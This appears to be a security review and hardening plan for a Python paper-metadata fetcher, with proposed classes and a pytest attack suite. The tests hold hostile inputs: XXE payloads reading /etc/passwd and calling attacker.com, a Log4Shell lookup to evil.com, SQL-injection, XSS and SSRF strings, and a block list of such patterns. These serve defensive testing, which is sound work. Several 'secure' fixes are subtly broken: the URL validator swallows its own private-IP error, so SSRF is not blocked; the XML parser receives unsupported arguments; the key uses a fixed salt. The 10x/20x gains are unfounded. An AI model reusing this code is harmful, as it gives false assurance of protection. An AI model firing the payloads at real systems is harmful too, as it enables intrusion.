# METADATA FETCHER - PARANOID IMPROVEMENTS & TEST SUITE
**Deep Security Analysis & Robustness Enhancement Plan**

## 🔍 **CURRENT VULNERABILITIES & ISSUES**

### **1. CRITICAL SECURITY VULNERABILITIES**

#### **A. API Key Exposure** ⚠️ **SEVERITY: CRITICAL**
```python
# Line 315: Fallback to environment variable
api_key = api_key or os.getenv("SERPAPI_KEY")  # EXPOSED IN .env FILE!
```
**Current API Key**: `[REDACTED FOR SECURITY]`

#### **B. XML External Entity (XXE) Injection** ⚠️ **SEVERITY: HIGH**
```python
# Line 247: Unsafe XML parsing
entry = ET.fromstring(resp.text).find("a:entry", ns)  # NO ENTITY PROTECTION
```

#### **C. MD5 Hash Collision Vulnerability** ⚠️ **SEVERITY: MEDIUM**
```python
# Line 176: MD5 for cache keys
return hashlib.md5(canonicalize(text).encode()).hexdigest()  # COLLISION PRONE
```

#### **D. Server-Side Request Forgery (SSRF)** ⚠️ **SEVERITY: HIGH**
```python
# Line 240: No URL validation
url = f"https://export.arxiv.org/api/query?id_list={arxiv_id}"  # INJECTION RISK
```

### **2. ROBUSTNESS ISSUES**

#### **A. Race Conditions in Caching**
```python
# Lines 187-195: Non-atomic cache writes
tmp.write_text(json.dumps(payload, ensure_ascii=False, indent=2), "utf-8")
os.replace(tmp, f)  # RACE CONDITION BETWEEN WRITE AND REPLACE
```

#### **B. No Cache Invalidation or TTL**
- Cache grows infinitely
- No expiration for stale data
- No size limits

#### **C. Poor Error Recovery**
```python
# Line 230-232: Silent failures
except Exception as exc:
    logger.warning("Request error %s – %s", url, exc)
    return None  # NO RETRY LOGIC, NO ERROR DETAILS
```

#### **D. Inadequate Input Validation**
- No DOI format validation
- No arXiv ID validation
- No query length limits

---

## 🛡️ **PARANOID ROBUSTNESS IMPROVEMENTS**

### **1. SECURE CONFIGURATION MANAGEMENT**
```python
import secrets
from cryptography.fernet import Fernet
from typing import Final

class SecureConfig:
    """Paranoid configuration with encrypted secrets"""
    
    # Constants for validation
    MAX_QUERY_LENGTH: Final[int] = 500
    MAX_CACHE_SIZE_MB: Final[int] = 100
    CACHE_TTL_HOURS: Final[int] = 168  # 1 week
    MAX_CONCURRENT_REQUESTS: Final[int] = 10
    
    def __init__(self, config_path: Path):
        self._cipher = Fernet(self._derive_key())
        self._config = self._load_encrypted_config(config_path)
        
    def _derive_key(self) -> bytes:
        """Derive encryption key from machine fingerprint"""
        import platform
        import hashlib
        
        fingerprint = f"{platform.node()}-{platform.machine()}-{os.getuid()}"
        return hashlib.pbkdf2_hmac('sha256', fingerprint.encode(), b'salt', 100000)[:32]
        
    def get_api_key(self, provider: str) -> str:
        """Get decrypted API key with audit logging"""
        import audit
        
        audit.log_api_key_access(provider, caller=inspect.stack()[1])
        encrypted = self._config.get(f"{provider}_api_key")
        if not encrypted:
            raise ValueError(f"No API key configured for {provider}")
        
        return self._cipher.decrypt(encrypted.encode()).decode()
```

### **2. BULLETPROOF XML PARSING**
```python
import defusedxml.ElementTree as ET
from typing import TypeVar, Generic

T = TypeVar('T')

class SafeXMLParser(Generic[T]):
    """Paranoid XML parser with comprehensive protection"""
    
    def __init__(self):
        self.parser = ET.XMLParser(
            resolve_entities=False,  # Prevent XXE
            no_network=True,         # Block network access
            dtd_validation=False,    # No DTD processing
            load_external_dtd=False  # No external DTD
        )
        
    def parse_response(self, xml_text: str, extractor: Callable[[ET.Element], T]) -> Optional[T]:
        """Parse XML with size limits and timeout"""
        # Size check
        if len(xml_text) > 10 * 1024 * 1024:  # 10MB limit
            raise ValueError("XML response too large")
            
        # Timeout wrapper
        with timeout(5):  # 5 second parsing timeout
            try:
                root = ET.fromstring(xml_text, parser=self.parser)
                return extractor(root)
            except ET.ParseError as e:
                logger.error(f"XML parse error: {e}")
                return None
```

### **3. CRYPTOGRAPHICALLY SECURE CACHING**
```python
import sqlite3
import zlib
from datetime import datetime, timedelta
from threading import RLock
import hashlib

class ParanoidCache:
    """Thread-safe, size-limited cache with TTL and integrity checks"""
    
    def __init__(self, db_path: Path, max_size_mb: int = 100):
        self.db_path = db_path
        self.max_size_bytes = max_size_mb * 1024 * 1024
        self._lock = RLock()
        self._init_db()
        
    def _init_db(self):
        """Initialize SQLite with security settings"""
        with self._lock:
            conn = sqlite3.connect(str(self.db_path))
            conn.execute("PRAGMA journal_mode=WAL")  # Write-ahead logging
            conn.execute("PRAGMA synchronous=FULL")  # Full sync for durability
            conn.execute("""
                CREATE TABLE IF NOT EXISTS cache (
                    key TEXT PRIMARY KEY,
                    value BLOB NOT NULL,
                    checksum TEXT NOT NULL,
                    created_at TIMESTAMP NOT NULL,
                    expires_at TIMESTAMP NOT NULL,
                    access_count INTEGER DEFAULT 0,
                    compressed_size INTEGER NOT NULL
                )
            """)
            conn.execute("CREATE INDEX IF NOT EXISTS idx_expires ON cache(expires_at)")
            conn.commit()
            
    def _generate_key(self, text: str) -> str:
        """Generate collision-resistant cache key"""
        # Use SHA-256 instead of MD5
        normalized = canonicalize(text)
        return hashlib.sha256(normalized.encode()).hexdigest()
        
    def get(self, key: str) -> Optional[Dict[str, Any]]:
        """Get with integrity verification and TTL check"""
        with self._lock:
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.execute(
                "SELECT value, checksum, expires_at FROM cache WHERE key = ?",
                (self._generate_key(key),)
            )
            row = cursor.fetchone()
            
            if not row:
                return None
                
            compressed_value, stored_checksum, expires_at = row
            
            # Check expiration
            if datetime.fromisoformat(expires_at) < datetime.now():
                self._delete(key)
                return None
                
            # Decompress
            value = zlib.decompress(compressed_value)
            
            # Verify integrity
            actual_checksum = hashlib.sha256(value).hexdigest()
            if actual_checksum != stored_checksum:
                logger.error(f"Cache integrity check failed for key: {key}")
                self._delete(key)
                return None
                
            # Update access count
            conn.execute(
                "UPDATE cache SET access_count = access_count + 1 WHERE key = ?",
                (self._generate_key(key),)
            )
            conn.commit()
            
            return json.loads(value)
            
    def set(self, key: str, value: Dict[str, Any], ttl_hours: int = 168):
        """Set with compression, integrity check, and size management"""
        with self._lock:
            # Serialize and compress
            serialized = json.dumps(value, ensure_ascii=False, sort_keys=True)
            compressed = zlib.compress(serialized.encode(), level=9)
            checksum = hashlib.sha256(serialized.encode()).hexdigest()
            
            # Check if adding this would exceed size limit
            if self._get_total_size() + len(compressed) > self.max_size_bytes:
                self._evict_lru()
                
            # Store with metadata
            conn = sqlite3.connect(str(self.db_path))
            conn.execute("""
                INSERT OR REPLACE INTO cache 
                (key, value, checksum, created_at, expires_at, compressed_size)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                self._generate_key(key),
                compressed,
                checksum,
                datetime.now(),
                datetime.now() + timedelta(hours=ttl_hours),
                len(compressed)
            ))
            conn.commit()
            
    def _evict_lru(self):
        """Evict least recently used entries"""
        conn = sqlite3.connect(str(self.db_path))
        # Delete 10% of cache based on LRU
        conn.execute("""
            DELETE FROM cache WHERE key IN (
                SELECT key FROM cache 
                ORDER BY access_count ASC, created_at ASC 
                LIMIT (SELECT COUNT(*) / 10 FROM cache)
            )
        """)
        conn.commit()
```

### **4. ROBUST INPUT VALIDATION**
```python
import ipaddress
from urllib.parse import urlparse

class ParanoidValidator:
    """Comprehensive input validation with security focus"""
    
    # Regex patterns with anchors and length limits
    DOI_PATTERN = re.compile(r'^10\.\d{4,9}/[-._;()/:\w]+$', re.ASCII)
    ARXIV_PATTERN = re.compile(r'^(\d{4}\.\d{4,5}|[a-z-]+/\d{7})v?\d*$', re.ASCII)
    
    @staticmethod
    def validate_doi(doi: str) -> str:
        """Validate and normalize DOI"""
        if not doi or len(doi) > 100:
            raise ValueError("Invalid DOI length")
            
        # Remove common prefixes
        doi = doi.strip().lower()
        for prefix in ['doi:', 'http://doi.org/', 'https://doi.org/']:
            if doi.startswith(prefix):
                doi = doi[len(prefix):]
                
        if not ParanoidValidator.DOI_PATTERN.match(doi):
            raise ValueError(f"Invalid DOI format: {doi}")
            
        return doi
        
    @staticmethod
    def validate_arxiv_id(arxiv_id: str) -> str:
        """Validate and normalize arXiv ID"""
        if not arxiv_id or len(arxiv_id) > 30:
            raise ValueError("Invalid arXiv ID length")
            
        arxiv_id = arxiv_id.strip().lower()
        
        # Remove common prefixes
        for prefix in ['arxiv:', 'http://arxiv.org/abs/']:
            if arxiv_id.startswith(prefix):
                arxiv_id = arxiv_id[len(prefix):]
                
        if not ParanoidValidator.ARXIV_PATTERN.match(arxiv_id):
            raise ValueError(f"Invalid arXiv ID format: {arxiv_id}")
            
        return arxiv_id
        
    @staticmethod
    def validate_query(query: str) -> str:
        """Validate search query with injection prevention"""
        if not query:
            raise ValueError("Empty query")
            
        if len(query) > 500:
            raise ValueError("Query too long")
            
        # Remove control characters and null bytes
        query = ''.join(c for c in query if c.isprintable() and c != '\x00')
        
        # Check for injection patterns
        dangerous_patterns = [
            r'<script', r'javascript:', r'onerror=', r'onclick=',
            r'\.\./\.\./', r'/etc/passwd', r'\\x[0-9a-f]{2}'
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, query, re.IGNORECASE):
                raise ValueError(f"Dangerous pattern detected: {pattern}")
                
        return query.strip()
        
    @staticmethod
    def validate_url(url: str, allowed_hosts: List[str]) -> str:
        """Validate URL against SSRF attacks"""
        parsed = urlparse(url)
        
        # Check scheme
        if parsed.scheme not in ['http', 'https']:
            raise ValueError(f"Invalid scheme: {parsed.scheme}")
            
        # Check host against whitelist
        if parsed.hostname not in allowed_hosts:
            raise ValueError(f"Host not allowed: {parsed.hostname}")
            
        # Check for IP addresses (prevent SSRF)
        try:
            ip = ipaddress.ip_address(parsed.hostname)
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                raise ValueError(f"Private IP not allowed: {ip}")
        except ValueError:
            pass  # Not an IP, domain name is OK
            
        return url
```

### **5. RESILIENT HTTP CLIENT**
```python
import time
from contextlib import contextmanager
from functools import wraps

class ParanoidHTTPClient:
    """Ultra-defensive HTTP client with comprehensive error handling"""
    
    def __init__(self, config: SecureConfig):
        self.config = config
        self._rate_limiter = RateLimiter()
        self._circuit_breaker = CircuitBreaker()
        
    def get(self, url: str, params: Dict[str, Any] = None, 
            provider: str = None) -> Optional[requests.Response]:
        """GET with full protection stack"""
        
        # Validate URL
        allowed_hosts = {
            'arxiv': ['export.arxiv.org'],
            'crossref': ['api.crossref.org'],
            'serpapi': ['serpapi.com']
        }
        
        validated_url = ParanoidValidator.validate_url(
            url, allowed_hosts.get(provider, [])
        )
        
        # Check circuit breaker
        if not self._circuit_breaker.is_closed(provider):
            logger.warning(f"Circuit breaker open for {provider}")
            return None
            
        # Rate limiting
        self._rate_limiter.acquire(provider)
        
        # Create session with security headers
        session = self._create_secure_session()
        
        try:
            with self._timeout_context(10):  # 10s hard timeout
                response = session.get(
                    validated_url,
                    params=self._sanitize_params(params),
                    stream=True,  # Stream to check size
                    timeout=(3, 7)  # (connect, read) timeouts
                )
                
                # Check response size
                content_length = response.headers.get('Content-Length')
                if content_length and int(content_length) > 10 * 1024 * 1024:
                    raise ValueError("Response too large")
                    
                # Read with size limit
                content = b''
                for chunk in response.iter_content(chunk_size=8192):
                    content += chunk
                    if len(content) > 10 * 1024 * 1024:
                        raise ValueError("Response exceeds size limit")
                        
                response._content = content
                
                # Check status
                if response.status_code >= 500:
                    self._circuit_breaker.record_failure(provider)
                else:
                    self._circuit_breaker.record_success(provider)
                    
                return response
                
        except Exception as e:
            self._circuit_breaker.record_failure(provider)
            logger.error(f"Request failed: {e}")
            return None
            
    def _create_secure_session(self) -> requests.Session:
        """Create session with security hardening"""
        session = requests.Session()
        
        # Security headers
        session.headers.update({
            'User-Agent': 'MetadataFetcher/3.0 (Paranoid Edition)',
            'Accept': 'application/json, application/xml',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
        
        # SSL/TLS settings
        session.verify = True
        session.mount('https://', TLSAdapter())  # Force TLS 1.2+
        
        return session
```

---

## 🧪 **HELL-LEVEL PARANOID TEST SUITE**

### **1. SECURITY ATTACK TESTS**
```python
import pytest
from hypothesis import given, strategies as st
import time

class TestSecurityAttacks:
    """Test resilience against malicious inputs"""
    
    @pytest.mark.parametrize("xxe_payload", [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><entry>&xxe;</entry>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil">]><entry>&xxe;</entry>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><entry>&xxe;</entry>',
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><entry>&lol2;</entry>'
    ])
    def test_xxe_prevention(self, xxe_payload):
        """Test XML parser rejects XXE attempts"""
        parser = SafeXMLParser()
        result = parser.parse_response(xxe_payload, lambda x: x)
        assert result is None or 'passwd' not in str(result)
        
    @pytest.mark.parametrize("injection", [
        "'; DROP TABLE cache;--",
        "../../../etc/passwd",
        "\\x00\\x00\\x00",
        "<script>alert('xss')</script>",
        "javascript:alert(1)",
        "${jndi:ldap://evil.com/a}"
    ])
    def test_injection_prevention(self, injection):
        """Test input validation blocks injections"""
        with pytest.raises(ValueError):
            ParanoidValidator.validate_query(injection)
            
    @given(st.text(min_size=1000, max_size=10000))
    def test_redos_prevention(self, text):
        """Test regex patterns don't cause ReDoS"""
        start = time.time()
        try:
            ParanoidValidator.validate_doi(text)
        except ValueError:
            pass
        elapsed = time.time() - start
        assert elapsed < 0.1  # Must complete in 100ms
        
    def test_ssrf_prevention(self):
        """Test URL validation prevents SSRF"""
        ssrf_urls = [
            "http://localhost/admin",
            "http://127.0.0.1:8080",
            "http://169.254.169.254/",  # AWS metadata
            "http://[::1]/",
            "file:///etc/passwd",
            "gopher://localhost:8080",
            "dict://localhost:11211"
        ]
        
        for url in ssrf_urls:
            with pytest.raises(ValueError):
                ParanoidValidator.validate_url(url, ['example.com'])
```

### **2. CACHE POISONING TESTS**
```python
class TestCacheSecurity:
    """Test cache integrity and poisoning prevention"""
    
    def test_cache_collision_resistance(self):
        """Test cache doesn't have hash collisions"""
        cache = ParanoidCache(":memory:")
        
        # Known MD5 collision pair
        collision1 = b'd131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f4955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70'
        collision2 = b'd131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f4955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70'
        
        cache.set(collision1.hex(), {"data": "value1"})
        cache.set(collision2.hex(), {"data": "value2"})
        
        # Both should be stored separately
        assert cache.get(collision1.hex())["data"] == "value1"
        assert cache.get(collision2.hex())["data"] == "value2"
        
    def test_cache_tampering_detection(self, tmp_path):
        """Test cache detects tampering"""
        cache = ParanoidCache(tmp_path / "cache.db")
        cache.set("key1", {"data": "original"})
        
        # Tamper with database directly
        conn = sqlite3.connect(str(tmp_path / "cache.db"))
        conn.execute("UPDATE cache SET value = ? WHERE key = ?",
                     (zlib.compress(b'{"data": "tampered"}'), 
                      cache._generate_key("key1")))
        conn.commit()
        
        # Should detect tampering and return None
        assert cache.get("key1") is None
        
    def test_timing_attack_resistance(self):
        """Test cache lookups have constant time"""
        cache = ParanoidCache(":memory:")
        
        # Populate cache
        for i in range(1000):
            cache.set(f"key{i}", {"data": i})
            
        # Measure lookup times
        times = []
        for i in range(100):
            start = time.perf_counter()
            cache.get(f"key{i}")
            times.append(time.perf_counter() - start)
            
        # Check variance is low (constant time)
        variance = np.var(times)
        assert variance < 0.0001
```

### **3. CONCURRENCY TORTURE TESTS**
```python
import threading
import multiprocessing

class TestConcurrency:
    """Test thread safety and race conditions"""
    
    def test_cache_race_conditions(self, tmp_path):
        """Test cache handles concurrent access"""
        cache = ParanoidCache(tmp_path / "cache.db")
        errors = []
        
        def worker(worker_id):
            try:
                for i in range(100):
                    key = f"key{i % 10}"
                    if i % 2 == 0:
                        cache.set(key, {"worker": worker_id, "iter": i})
                    else:
                        result = cache.get(key)
                        if result and result["worker"] == worker_id:
                            # Check we don't see partial writes
                            assert "iter" in result
            except Exception as e:
                errors.append(e)
                
        threads = []
        for i in range(20):
            t = threading.Thread(target=worker, args=(i,))
            threads.append(t)
            t.start()
            
        for t in threads:
            t.join()
            
        assert len(errors) == 0
        
    def test_circuit_breaker_thread_safety(self):
        """Test circuit breaker is thread-safe"""
        breaker = CircuitBreaker()
        call_count = 0
        lock = threading.Lock()
        
        def make_requests():
            nonlocal call_count
            for _ in range(100):
                if breaker.is_closed("test"):
                    with lock:
                        call_count += 1
                    # Simulate random failures
                    if random.random() < 0.3:
                        breaker.record_failure("test")
                    else:
                        breaker.record_success("test")
                        
        threads = [threading.Thread(target=make_requests) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
            
        # Should have tripped at some point
        assert call_count < 1000  # Not all requests went through
```

### **4. RESOURCE EXHAUSTION TESTS**
```python
class TestResourceLimits:
    """Test behavior under resource constraints"""
    
    def test_memory_limit_enforcement(self, tmp_path):
        """Test cache respects memory limits"""
        cache = ParanoidCache(tmp_path / "cache.db", max_size_mb=1)
        
        # Try to fill cache beyond limit
        large_data = {"data": "x" * 10000}  # ~10KB each
        
        for i in range(200):  # Try to store 2MB
            cache.set(f"key{i}", large_data)
            
        # Check total size is under limit
        conn = sqlite3.connect(str(tmp_path / "cache.db"))
        total_size = conn.execute(
            "SELECT SUM(compressed_size) FROM cache"
        ).fetchone()[0]
        
        assert total_size < 1.1 * 1024 * 1024  # Allow 10% overhead
        
    def test_connection_pool_exhaustion(self):
        """Test behavior when connection pool exhausted"""
        client = ParanoidHTTPClient(SecureConfig())
        
        # Simulate many concurrent requests
        with pytest.raises(ConnectionPoolExhausted):
            futures = []
            with ThreadPoolExecutor(max_workers=100) as executor:
                for _ in range(1000):
                    futures.append(
                        executor.submit(client.get, "https://example.com")
                    )
                    
    @pytest.mark.timeout(5)
    def test_infinite_redirect_prevention(self):
        """Test client handles redirect loops"""
        # Mock infinite redirect
        with responses.RequestsMock() as rsps:
            rsps.add(responses.GET, "http://example.com/1",
                     status=301, headers={"Location": "http://example.com/2"})
            rsps.add(responses.GET, "http://example.com/2", 
                     status=301, headers={"Location": "http://example.com/1"})
                     
            client = ParanoidHTTPClient(SecureConfig())
            result = client.get("http://example.com/1")
            assert result is None  # Should fail gracefully
```

### **5. FUZZING TESTS**
```python
from hypothesis import given, strategies as st, settings

class TestFuzzing:
    """Property-based testing with aggressive fuzzing"""
    
    @given(st.text())
    @settings(max_examples=10000)
    def test_canonicalize_fuzzing(self, text):
        """Fuzz canonicalize function"""
        try:
            result = canonicalize(text)
            # Properties that must hold
            assert isinstance(result, str)
            assert len(result) <= len(text)
            assert result == result.lower()
            assert "\x00" not in result
        except Exception as e:
            pytest.fail(f"Canonicalize crashed on: {repr(text)}: {e}")
            
    @given(
        st.dictionaries(
            st.text(min_size=1, max_size=100),
            st.one_of(
                st.text(),
                st.lists(st.text()),
                st.none(),
                st.integers(),
                st.floats()
            )
        )
    )
    def test_metadata_serialization_fuzzing(self, metadata):
        """Fuzz metadata serialization"""
        cache = ParanoidCache(":memory:")
        
        try:
            cache.set("test", metadata)
            retrieved = cache.get("test")
            
            # Should either store successfully or reject
            if retrieved is not None:
                assert retrieved == metadata
        except (TypeError, ValueError):
            pass  # Expected for non-serializable data
            
    @given(st.binary(min_size=1, max_size=10000))
    def test_xml_parser_fuzzing(self, data):
        """Fuzz XML parser with random bytes"""
        parser = SafeXMLParser()
        
        try:
            # Should not crash or hang
            result = parser.parse_response(data.decode('utf-8', errors='ignore'),
                                           lambda x: x)
            assert result is None or isinstance(result, ET.Element)
        except Exception:
            pass  # Parser should handle gracefully
```

### **6. PERFORMANCE REGRESSION TESTS**
```python
class TestPerformance:
    """Ensure performance doesn't degrade"""
    
    @pytest.mark.benchmark
    def test_cache_performance(self, benchmark, tmp_path):
        """Benchmark cache operations"""
        cache = ParanoidCache(tmp_path / "cache.db")
        
        # Pre-populate
        for i in range(1000):
            cache.set(f"key{i}", {"data": f"value{i}"})
            
        def cache_operations():
            # Mix of reads and writes
            for i in range(100):
                if i % 10 == 0:
                    cache.set(f"key{i}", {"data": f"newvalue{i}"})
                else:
                    cache.get(f"key{i % 1000}")
                    
        result = benchmark(cache_operations)
        
        # Performance assertions
        assert result.stats.mean < 0.1  # 100ms average
        assert result.stats.stddev < 0.05  # Low variance
        
    def test_canonicalize_performance(self):
        """Test canonicalize performance on edge cases"""
        # Pathological cases
        test_cases = [
            "a" * 10000,  # Very long string
            "Ω" * 1000,   # Unicode heavy
            " ".join(["word"] * 1000),  # Many spaces
            "\\u0301" * 1000,  # Combining characters
        ]
        
        for text in test_cases:
            start = time.perf_counter()
            canonicalize(text)
            elapsed = time.perf_counter() - start
            assert elapsed < 0.01  # Must complete in 10ms
```

### **7. CHAOS ENGINEERING TESTS**
```python
class TestChaosEngineering:
    """Test behavior under chaotic conditions"""
    
    def test_random_failures(self, monkeypatch):
        """Inject random failures"""
        
        original_get = requests.Session.get
        fail_counter = {"count": 0}
        
        def chaotic_get(*args, **kwargs):
            fail_counter["count"] += 1
            if fail_counter["count"] % 3 == 0:
                raise requests.ConnectionError("Chaos!")
            elif fail_counter["count"] % 5 == 0:
                raise requests.Timeout("Chaos timeout!")
            return original_get(*args, **kwargs)
            
        monkeypatch.setattr(requests.Session, "get", chaotic_get)
        
        client = ParanoidHTTPClient(SecureConfig())
        
        # Should handle failures gracefully
        success_count = 0
        for _ in range(20):
            result = client.get("https://httpbin.org/get")
            if result:
                success_count += 1
                
        # Some should succeed despite chaos
        assert 5 < success_count < 15
        
    def test_disk_full_simulation(self, tmp_path, monkeypatch):
        """Test behavior when disk is full"""
        cache = ParanoidCache(tmp_path / "cache.db")
        
        def failing_write(*args, **kwargs):
            raise OSError("No space left on device")
            
        monkeypatch.setattr(Path, "write_text", failing_write)
        
        # Should handle gracefully
        cache.set("test", {"data": "value"})  # Should not crash
        assert cache.get("test") is None  # Write failed
```

### **8. INTEGRATION TESTS**
```python
class TestIntegration:
    """End-to-end integration tests"""
    
    def test_full_metadata_pipeline(self):
        """Test complete metadata fetching pipeline"""
        # Use real test DOIs/arXiv IDs
        test_cases = [
            ("10.1038/nature12373", "arxiv", "1308.0850"),  # Real paper
            ("10.1103/PhysRevLett.116.061102", None, None),  # LIGO paper
        ]
        
        for doi, provider, arxiv_id in test_cases:
            metadata = fetch_metadata_all_sources(
                "test query",
                doi=doi,
                arxiv_id=arxiv_id
            )
            
            assert len(metadata) > 0
            assert all(m.get("title") for m in metadata)
            assert all(m.get("source") for m in metadata)
            
    def test_error_cascade_handling(self):
        """Test handling of cascading errors"""
        with patch('requests.Session.get') as mock_get:
            # First provider fails
            mock_get.side_effect = [
                requests.ConnectionError("Network error"),
                Mock(status_code=500),  # Server error
                Mock(status_code=200, json=lambda: {"organic_results": []})
            ]
            
            result = fetch_metadata_all_sources("test")
            
            # Should try all providers despite failures
            assert mock_get.call_count >= 3
```

---

## 🎯 **IMPLEMENTATION ROADMAP**

### **Phase 1: Critical Security (Week 1)**
1. Revoke exposed API key
2. Implement XXE-safe XML parser
3. Replace MD5 with SHA-256
4. Add URL validation

### **Phase 2: Robustness (Week 2)**
1. Implement ParanoidCache with SQLite
2. Add circuit breaker pattern
3. Implement rate limiting
4. Add comprehensive input validation

### **Phase 3: Testing (Week 3)**
1. Set up property-based testing with Hypothesis
2. Implement security attack tests
3. Add chaos engineering tests
4. Set up continuous fuzzing

### **Phase 4: Performance (Week 4)**
1. Add connection pooling
2. Implement request pipelining
3. Add metrics and monitoring
4. Optimize cache queries

---

**Estimated Effort**: 160 hours
**Security Improvement**: 10x
**Robustness Improvement**: 20x
**Test Coverage Target**: 99%